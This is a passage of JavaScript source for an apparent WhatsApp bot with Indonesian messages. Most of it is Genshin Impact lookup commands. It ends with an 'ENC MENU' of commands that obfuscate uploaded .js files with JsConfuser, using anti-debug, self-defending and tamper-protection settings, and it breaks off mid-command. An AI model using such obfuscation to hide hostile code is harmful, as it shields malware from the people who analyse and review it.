          let response = `*Senjata Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Type:* ${result.type || "Data tidak tersedia"}\n` + `*Base ATK:* ${result.baseAttack || "Data tidak tersedia"}\n` + `*Substat:* ${result.subStat || "Data tidak tersedia"}\n` + `*Passive Name:* ${result.passiveName || "Data tidak tersedia"}\n` + `*Passive Description:* ${result.passiveDescription || "Data tidak tersedia"}\n` + (result.refinement ? `\n*Refinement (${result.refinement.refine}):* ${result.refinement.description || "Data tidak tersedia"}\n` : "");
          m.reply(response);
        } else {
          m.reply("Senjata tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.weapons("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Senjata yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-voiceovers':
    case 'g-voiceovers':
    case 'gens-voiceovers': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} venti*\nHarap berikan nama voiceover.`);
      try {
        let result = await genshindb.voiceovers(text);
        if (result) {
          let response = `*Voiceover Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Voiceover tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.voiceovers("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Voiceover yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-viewpoint':
    case 'g-viewpoint':
    case 'gens-viewpoint': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} starfell valley*\nHarap berikan nama pemandangan.`);
      try {
        let result = await genshindb.viewpoints(text);
        if (result) {
          let response = `*Pemandangan Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Pemandangan tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.viewpoints("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Pemandangan yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-talents':
    case 'g-talents':
    case 'gens-talents': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} diluc*\nHarap berikan nama karakter untuk mencari bakatnya.`);
      try {
        let result = await genshindb.talents(text);
        if (result && result.length > 0) {
          let response = `*Bakat ditemukan untuk karakter ${text}:*\n\n`;
          result.forEach((talent, index) => {
            response += `*${index + 1}. ${talent.name}*\n`;
            response += `_${talent.description || "Deskripsi tidak tersedia"}_\n\n`;
            response += `*Jenis:* ${talent.type || "Data tidak tersedia"}\n`;
            response += `*Element:* ${talent.element || "Data tidak tersedia"}\n\n`;
          });
          m.reply(response);
        } else {
          m.reply(`Bakat untuk karakter '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        m.reply(`*Tidak Ditemukan*\n\n*Bakat untuk karakter '${text}' tidak ditemukan.`);
      }
    };
    break

    case 'genshin-potion':
    case 'g-potion':
    case 'gens-potion': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} squirrel fish*\nHarap berikan nama ramuan atau makanan.`)
      try {
        let result = await genshindb.foods(text);
        if (result) {
          let response = `*Ramuan atau Makanan Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Efek:* ${result.effect || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply(`Ramuan atau makanan '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        try {
          let availableFoods = await genshindb.foods("names", {
            matchCategories: true
          });
          m.reply(`*List ${text} foods :*\n\n- ${availableFoods.join("\n- ")}`);
        } catch (err) {
          m.reply('Terjadi Kesalahan...')
          let availableFoods = await genshindb.foods("names", {
            matchCategories: true
          });
          m.reply(`*Not Found*\n\n*Available foods is :*\n${availableFoods.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-outfit':
    case 'g-outfit':
    case 'gens-outfit': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} outrider*\nHarap berikan nama kostum atau outfit.`);
      try {
        let result = await genshindb.outfits(text);
        if (result) {
          let response = `*Kostum Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Karakter:* ${result.character || "Data tidak tersedia"}`;
          if (result.url && result.url.modelviewer) {
            response += `\n_${result.url.modelviewer}_`;
          }
          m.reply(response);
        } else {
          m.reply(`Kostum '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        try {
          let availableOutfits = await genshindb.outfits(text, {
            matchCategories: true
          });
          m.reply(`*List ${text} outfit :*\n\n- ${availableOutfits.join("\n- ")}`);
        } catch (err) {
          m.reply('Terjadi Kesalahan...')
          let availableOutfits = await genshindb.outfits("names", {
            matchCategories: true
          });
          m.reply(`*Not Found*\n\n*Available outfits is:*\n${availableOutfits.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-nation':
    case 'g-nation':
    case 'gens-nation': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} mondstadt*\nHarap berikan nama wilayah atau nasionalitas.`);
      try {
        let result = await genshindb.geographies(text);
        if (result) {
          let response = `*Informasi Wilayah Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
          response += `*Region:* ${result.region || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Informasi wilayah tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.geographies("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Wilayah yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-namacard':
    case 'g-namacard':
    case 'gens-namacard': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} anemo flare*\nHarap berikan nama kartu nama.`);
      try {
        let result = await genshindb.namecards(text);
        if (result) {
          let response = `*Kartu Nama Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Unlock:* ${result.unlock || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Kartu nama tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.namecards("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Kartu nama yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-materials':
    case 'g-materials':
    case 'gens-materials': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} boreal wolf's milk*\nHarap berikan nama material.`);
      try {
        let result = await genshinmaterials(text);
        if (result) {
          let response = `*Material Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Type:* ${result.type || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Material tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshinmaterials("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Material yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-food':
    case 'g-food':
    case 'gens-food': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} temptation*\nHarap berikan nama makanan.`);
      try {
        let result = await genshindb.foods(text);
        if (result) {
          let response = `*Makanan Ditemukan: ${result.name}*\n\n`;
          response += `_"${result.description}"_\n\n`;
          response += `*Rarity:* ${result.rarity}\n`;
          response += `*Type:* ${result.foodtype}\n`;
          response += `*Category:* ${result.foodfilter} (${result.foodcategory})\n\n`;
          if (result.effect) {
            response += `*Effect:*\n${result.effect}\n\n`;
          }
          if (result.suspicious) {
            response += `*Suspicious:*\n${result.suspicious.effect}\n_"${result.suspicious.description}"_\n\n`;
          }
          if (result.normal) {
            response += `*Normal:*\n${result.normal.effect}\n_"${result.normal.description}"_\n\n`;
          }
          if (result.delicious) {
            response += `*Delicious:*\n${result.delicious.effect}\n_"${result.delicious.description}"_\n\n`;
          }
          m.reply(response);
        } else {
          m.reply("Makanan tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.foods("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Makanan yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-enemy':
    case 'g-enemy':
    case 'gens-enemy': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} ruin guard*\nHarap berikan nama musuh.`);
      try {
        let result = await genshindb.enemies(text);
        if (result) {
          let response = `*Musuh Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
          response += `*Level:* ${result.level || "Data tidak tersedia"}\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Element:* ${result.element || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Musuh tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.enemies("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Musuh yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-emoji':
    case 'g-emoji':
    case 'gens-emoji': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} anemo*\nHarap berikan nama emoji.`);
      try {
        let result = await genshindb.emojis(text);
        if (result) {
          let response = `*Emoji Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Emoji tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.emojis("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Emoji yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-domain':
    case 'g-domain':
    case 'gens-domain': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} valley of remembrance*\nHarap berikan nama domain.`);
      try {
        let result = await genshindb.domains(text);
        if (result) {
          let response = `*Domain Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
          response += `*Level:* ${result.level || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Domain tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.domains("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Domain yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-craft':
    case 'g-craft':
    case 'gens-craft': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} mystical enhancement ore*\nHarap berikan nama craft.`);
      try {
        let result = await genshindb.crafts(text);
        if (result) {
          let response = `*Craft Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Type:* ${result.type || "Data tidak tersedia"}\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Craft tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.crafts("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Craft yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-const':
    case 'g-const':
    case 'gens-const':
    case 'genshin-constellation':
    case 'g-constellation':
    case 'gens-constellation': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} diluc*\nHarap berikan nama karakter untuk mencari konstelasinya.`);
      try {
        let result = await genshindb.constellations(text);
        if (result && result.length > 0) {
          let response = `*Konstelasi ditemukan untuk karakter ${text}:*\n\n`;
          result.forEach((constellation, index) => {
            response += `*${index + 1}. ${constellation.name}*\n`;
            response += `_${constellation.effect}_\n\n`;
            response += `*Unlock At:* C${constellation.unlock || "Data tidak tersedia"}`;
            if (index < result.length - 1) response += "\n\n";
          });
          m.reply(response);
        } else {
          m.reply(`Konstelasi untuk karakter '${text}' tidak ditemukan.`);
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        m.reply(`*Tidak Ditemukan*\n\n*Konstelasi untuk karakter '${text}' tidak ditemukan.`);
      }
    };
    break

    case 'genshin-artifaact':
    case 'g-artifact':
    case 'gens-artifact': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} berserker*\nHarap berikan nama artefak.`);
      try {
        let result = await genshindb.artifacts(text);
        if (result) {
          let response = `*Artefak Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Set:* ${result.set || "Data tidak tersedia"}\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Slot:* ${result.slot || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Artefak tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.artifacts("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Artefak yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-area':
    case 'g-area':
    case 'gens-area': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} liyue*\nHarap berikan nama tempat.`);
      try {
        let result = await genshindb.geographies(text);
        if (result) {
          let response = `*Info Geografi: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
          response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
          response += `*Urutan Sortir:* ${result.sortorder || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Geografi tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.geographies("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Geografi yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-animal':
    case 'g-animals':
    case 'gens-animals': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} shiba*\nHarap berikan nama hewan.`);
      try {
        let animal = await genshindb.animals(text);
        if (animal) {
          let response = `*Hewan Ditemukan: ${animal.name}*\n\n`;
          response += `"${animal.description}"\n\n`;
          response += `*Kategori:* ${animal.category || ""}\n`;
          response += `*Jenis Hitungan:* ${animal.counttype || ""}\n`;
          response += `_${animal.sortorder ? `Urutan Sortir: ${animal.sortorder}` : ""}_`;
          m.reply(response);
        } else {
          m.reply("Hewan tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        try {
          let animalCategories = await genshindb.animals(text, {
            matchCategories: true
          });
          m.reply(`*Kategori Hewan ${text} :*\n\n- ${animalCategories.join("\n- ")}`);
        } catch (err) {
          m.reply('Terjadi Kesalahan...')
          let allAnimalNames = await genshindb.animals("names", {
            matchCategories: true
          });
          m.reply(`*Tidak Ditemukan*\n\n*Hewan yang tersedia:* ${allAnimalNames.join(", ")}`);
        }
      }
    };
    break

    case 'genshin-rankaddventure':
    case 'g-rankaddventure':
    case 'genshin-advrank':
    case 'g-advrank':
    case 'gens-rankaddventure':
    case 'gens-advrank': {
      
      if (!text || isNaN(parseInt(text))) {
        return m.reply(`Masukkan nomor peringkat petualang yang valid. Contoh: *${prefix + command} 5*`);
      }
      try {
        let rankNumber = parseInt(text);
        let result = await genshindb.adventureranks(rankNumber);
        if (result) {
          let response = `*Rank Petualang Ditemukan untuk Rank ${rankNumber}:*\n\n`;
          response += `*Experience:* ${result.exp || "Data tidak tersedia"}\n`;
          response += `*Reward:* ${result.reward || "Data tidak tersedia"}\n`;
          response += `*Deskripsi:* ${result.description || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply(`Rank petualang untuk Rank ${rankNumber} tidak ditemukan.`);
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let availableRanks = await genshindb.adventureranks("names");
        m.reply(`*Tidak Ditemukan*\n\n*Rank petualang yang tersedia:* ${availableRanks.join(", ")}`);
      }
    };
    break

    case 'genshin-achievement':
    case 'g-achievement':
    case 'gens-achievement': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} mondstadt*\nHarap berikan nama prestasi.`);
      try {
        let result = await genshindb.achievements(text);
        if (result) {
          let response = `*${result.name}*\n`;
          response += `_${result.description}_\n\n`;
          response += `*Kategori:* ${result.category || ""}\n`;
          response += `*Rarity:* ${result.rarity || ""}\n`;
          response += `*Detail:* ${result.detail || ""}\n`;
          response += `*Cara Mendapatkan:* ${result.howToObtain || ""}\n`;
          m.reply(response);
        } else {
          m.reply("Prestasi tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.achievements("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Prestasi yang tersedia:* ${available.join(", ")}`);
      }
    };
    break

    case 'genshin-char':
    case 'g-char':
    case 'gens-char':
    case 'genshin-characters':
    case 'g-characters':
    case 'gens-characters': {
      
      if (!text) return m.reply(`Contoh: *${prefix + command} diluc*\nHarap berikan nama karakter.`);
      try {
        let result = await genshindb.characters(text);
        if (result) {
          let response = `*Karakter Ditemukan: ${result.name}*\n\n`;
          response += `_${result.description}_\n\n`;
          response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
          response += `*Vision:* ${result.vision || "Data tidak tersedia"}\n`;
          response += `*Senjata:* ${result.weapon || "Data tidak tersedia"}`;
          m.reply(response);
        } else {
          m.reply("Karakter tidak ditemukan.");
        }
      } catch (err) {
        m.reply('Terjadi Kesalahan...')
        let available = await genshindb.characters("names", {
          matchCategories: true
        });
        m.reply(`*Tidak Ditemukan*\n\n*Karakter yang tersedia:* ${available.join(", ")}`);
      }
    };
    break
    
    //  ENC MENU
                case 'encarab':
            case 'encryptarab':
            case 'encrypt-arab':
            case 'arabenc':
            case 'arab-encrypt':
            case 'enc-arab': {
              if (!m.quoted) return m.reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file JavaScript (.js) untuk dienkripsi!')

                const arab = ['أ', 'ب', 'ت', 'ث', 'ج', 'ح', 'خ', 'د', 'ذ', 'ر', 'ز', 'س', 'ش', 'ص', 'ض', 'ط', 'ظ', 'ع', 'غ', 'ف', 'ق', 'ك', 'ل', 'م', 'ن', 'ه', 'و', 'ي']
                const genArab = () => Array.from({
                  length: Math.floor(Math.random() * 4) + 3
                }, () => arab[Math.floor(Math.random() * arab.length)]).join('')

                const getArabObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genArab,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getArabObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `arab-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: '✅ *Arab encrypted!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break
                        case 'encchina':
            case 'encryptchina':
            case 'encrypt-china':
            case 'chinaenc':
            case 'china-encrypt':
            case 'enc-china':
            case 'encmandarin':
            case 'encryptmandarin':
            case 'encrypt-mandarin':
            case 'mandarinenc':
            case 'mandarin-encrypt':
            case 'enc-mandarin': {
              if (!m.quoted) return m.reply('Balas file .js untuk dienkripsi!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file `.js` untuk dienkripsi!')

                const mandarin = [
                  "龙", "虎", "风", "云", "山", "河", "天", "地", "雷", "电", "火", "水",
                  "木", "金", "土", "星", "月", "日", "光", "影", "峰", "泉", "林", "海",
                  "雪", "霜", "雾", "冰", "焰", "石"
                ]
                const genMandarin = () => Array.from({
                  length: Math.floor(Math.random() * 4) + 3
                }, () => mandarin[Math.floor(Math.random() * mandarin.length)]).join('')

                const getMandarinObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genMandarin,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getMandarinObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `china-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: '✅ *Mandarin encrypted!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'enccustom':
            case 'encryptcustom':
            case 'encrypt-custom':
            case 'customenc':
            case 'custom-encrypt':
            case 'enc-custom': {
              if (!m.quoted) return m.reply('Kutip file .js untuk dienkripsi!')
              try {
                React()

                const args = (text || '').trim().split(/\s+/)
                const customName = (args[0] || '').replace(/[^a-zA-Z0-9_]/g, '')
                if (!customName) return m.reply(`Format: ${cmd} <nama>\nContoh: ${cmd} myid`)

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file `.js` untuk dienkripsi!')

                const idGen = () => {
                  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
                  let suf = ''
                  for (let i = 0; i < Math.floor(Math.random() * 3) + 2; i++) suf += chars[Math.floor(Math.random() * chars.length)]
                  return `${customName}_${suf}`
                }

                const getCustomObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: idGen,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.75,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getCustomObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `custom-encrypted-${customName}-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: `✅ *Custom encrypted (${customName})!*`
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encinvis':
            case 'encryptinvis':
            case 'encrypt-invis':
            case 'invisenc':
            case 'invis-encrypt':
            case 'enc-invis':
            case 'encinvisible':
            case 'encryptinvisible':
            case 'encrypt-invisible':
            case 'invisibleenc':
            case 'invisible-encrypt':
            case 'enc-invisible': {
              if (!m.quoted) return m.reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file `.js` untuk dienkripsi!')

                const genInvis = () => '_'.repeat(Math.floor(Math.random() * 4) + 3) + Math.random().toString(36).slice(2, 5)
                const getInvisObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genInvis,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

                const obf = await JsConfuser.obfuscate(raw, getInvisObf())
                const code = typeof obf === 'string' ? obf : (obf && obf.code) || String(obf)

                const outName = `invis-encrypted-${Date.now()}.js`
                const outPath = path.join(__dirname, outName)
                fs.writeFileSync(outPath, code, 'utf8')

                const fileBuffer = fs.readFileSync(outPath)
                await sock.sendMessage(m.chat, {
                  document: fileBuffer,
                  mimetype: 'application/javascript',
                  fileName: outName,
                  caption: '✅ *Invisible encrypted siap!*'
                }, {
                  quoted: fakeQuoted
                })

                try {
                  fs.unlinkSync(outPath)
                } catch (e) {}
              } catch (err) {
                console.error(err)
                m.reply(`❌ Terjadi kesalahan: ${err && err.message ? err.message : String(err)}`)
              }
            }
            break

            case 'encsiu':
            case 'encryptsiu':
            case 'encrypt-siu':
            case 'siuenc':
            case 'siu-encrypt':
            case 'enc-siu': {
              if (!m.quoted) return m.reply('Kutip pesan dokumen!')
              try {
                React()

                const fileName = quoted.fileName || ''
                if (!fileName.endsWith('.js')) return m.reply('Kutip file `.js` untuk dienkripsi!')

                const genSiu = () => {
                  const abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
                  let r = ''
                  for (let i = 0; i < 6; i++) r += abc[Math.floor(Math.random() * abc.length)]
                  return `CalceKarik和SiuSiu${r}`
                }

                const getSiuObf = () => ({
                  target: 'node',
                  compact: true,
                  renameVariables: true,
                  renameGlobals: true,
                  identifierGenerator: genSiu,
                  stringCompression: true,
                  stringEncoding: true,
                  stringSplitting: true,
                  controlFlowFlattening: 0.95,
                  flatten: true,
                  shuffle: true,
                  duplicateLiteralsRemoval: true,
                  deadCode: true,
                  calculator: true,
                  opaquePredicates: true,
                  lock: {
                    selfDefending: true,
                    antiDebug: true,
                    integrity: true,
                    tamperProtection: true
                  }
                })

                const bar = (p) => {
                  const t = 20
                  const f = Math.round(p / 5)
                  return `[${'█'.repeat(f)}${' '.repeat(t - f)}] ${p}%`
                }

                let media = await downloadContentFromMessage(quoted, 'document')
                let buffer = Buffer.from([])
                for await (const chunk of media) buffer = Buffer.concat([buffer, chunk])
                const raw = buffer.toString('utf8')

                try {
                  new Function(raw)
                } catch (e) {
                  return m.reply(`❌ File JS tidak valid:\n${e.message}`)
                }

